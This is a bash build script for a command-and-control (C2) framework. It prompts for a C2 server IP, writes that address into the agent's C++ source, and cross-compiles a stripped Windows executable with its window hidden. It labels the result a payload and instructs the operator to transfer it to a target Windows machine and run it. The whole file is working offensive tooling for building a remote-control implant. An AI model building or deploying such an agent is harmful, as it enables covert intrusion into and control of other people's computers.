#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}"
echo "            /\$\$\$\$\$\$                                         /\$\$          "
echo "           /\$\$\$_  \$\$                                       | \$\$          "
echo "  /\$\$\$\$\$\$\$| \$\$\$\$\\ \$\$ /\$\$\$\$\$/\$\$\$\$   /\$\$\$\$\$\$  /\$\$\$\$\$\$   /\$\$\$\$\$\$\$  /\$\$\$\$\$\$ "
echo " /\$\$_____/| \$\$ \$\$ \$\$| \$\$_  \$\$_  \$\$ /\$\$__  \$\$|____  \$\$ /\$\$__  \$\$ /\$\$__  \$\$"
echo "| \$\$      | \$\$\\ \$\$\$\$| \$\$ \\ \$\$ \\ \$\$| \$\$  \\__/ /\$\$\$\$\$\$\$| \$\$  | \$\$| \$\$\$\$\$\$\$\$"
echo "| \$\$      | \$\$ \\ \$\$\$| \$\$ | \$\$ | \$\$| \$\$      /\$\$__  \$\$| \$\$  | \$\$| \$\$_____/"
echo "|  \$\$\$\$\$\$\$|  \$\$\$\$\$\$/| \$\$ | \$\$ | \$\$| \$\$     |  \$\$\$\$\$\$\$|  \$\$\$\$\$\$\$|  \$\$\$\$\$\$\$"
echo " \\_______/ \\______/ |__/ |__/ |__/|__/      \\_______/ \\_______/ \\_______/"
echo ""
echo -e "${NC}"
echo -e "${YELLOW}[*] C2 Framework - Agent Builder & Compiler${NC}"

# Check for MinGW
echo -e "\n[*] Checking for MinGW Compiler..."
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo -e "${RED}[!] MinGW compiler not found.${NC}"
    echo "[*] Attempting to install 'mingw-w64'..."
    sudo apt-get update
    sudo apt-get install -y mingw-w64
    
    if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
        echo -e "${RED}[-] Installation failed or compiler still not found.${NC}"
        echo "Please install manually: sudo apt install mingw-w64"
        exit 1
    fi
else
    echo -e "${GREEN}[+] MinGW compiler found.${NC}"
fi

# Configuration
DEFAULT_IP="127.0.0.1"
read -p "[?] Enter C2 Server IP (Default: $DEFAULT_IP): " USER_IP
SERVER_IP=${USER_IP:-$DEFAULT_IP}

echo -e "[*] Updating configuration to connect to: ${GREEN}$SERVER_IP${NC}"

# Update main.cpp with new IP
sed -i "s/#define C2_SERVER \".*\"/#define C2_SERVER \"$SERVER_IP\"/" src/main.cpp

echo "[*] Compiling Agent..."
x86_64-w64-mingw32-g++ -O3 -s -static -mwindows src/main.cpp -o Agent.exe -lws2_32 -lwininet -ladvapi32 -lshell32 -liphlpapi

if [ -f "Agent.exe" ]; then
    echo -e "${GREEN}[+] Build Success!${NC}"
    echo -e "[+] Payload saved as: ${GREEN}Agent.exe${NC}"
    echo -e "[!] Transfer this file to the target Windows machine and run it."
else
    echo -e "${RED}[-] Compilation Failed.${NC}"
    exit 1
fi
